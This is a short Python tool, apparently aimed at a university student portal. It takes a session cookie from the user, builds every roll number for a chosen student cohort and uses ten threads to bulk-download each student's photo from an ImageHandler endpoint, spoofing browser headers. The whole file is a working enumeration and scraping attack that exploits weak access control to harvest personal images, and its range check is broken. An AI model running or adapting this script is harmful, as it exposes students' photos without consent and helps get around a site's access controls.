import requests
from os import system
from threading import Thread

system('mkdir output')

valid_links = []
valid_files = []

raw_links = []
raw_files = []

cookie = input("Nhap cai cookie vao: ")
authority = input("Nhap cai url vao (domain only): ")

payload = {
    'authority': authority,
    'accept': 'image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'cookie':  cookie,
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Microsoft Edge";v="96"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'image',
    'sec-fetch-mode': 'no-cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.53'
}


def get_links(y):
    global raw_links
    global authority
    mj = ["CA", "CE", "CS"]
    for i in range((12+y)*10000, (12+y)*10000+1000):
        for mjr in mj :
            name = mjr+str(i)
            link = f"https://{authority}/ImageHandler.ashx?RollNumber="+ name +"&Campus=6"
            raw_links.append(link)
            raw_files.append(f"{name}.png")
    return
            
def download():
    global payload
    global raw_links
    global raw_files

    while raw_links:
        link = raw_links.pop(0)
        file = raw_files.pop(0)
        print(r'[ - ] Getting {}'.format(file), end='\r')
        res = requests.get(url=link, headers=payload)
        if res.status_code == 200:
            print(f'[ + ] Getting {file} | Successful!')
            with open(f"./output/{file}", 'wb') as lf:
                for chunk in res.iter_content(chunk_size=128):
                    lf.write(chunk)
        else:
            print(f'[ ! ] Getting {file} | Fail!')
    return

def main():
    global valid_links
    try:
        print('Xin hay lua chon:\n1. K13\n2. K14\n3. K15\n4. K16\n5. K17\n>>> ', end='')
        y = int(input())
        if (5 < y < 1):
            raise
        get_links(y)
        for i in range(10):
            t = Thread(target=download)
            t.start()
    except:
        print("De'o cho down, oh, lam gi nhau!")
        exit(1)

main()
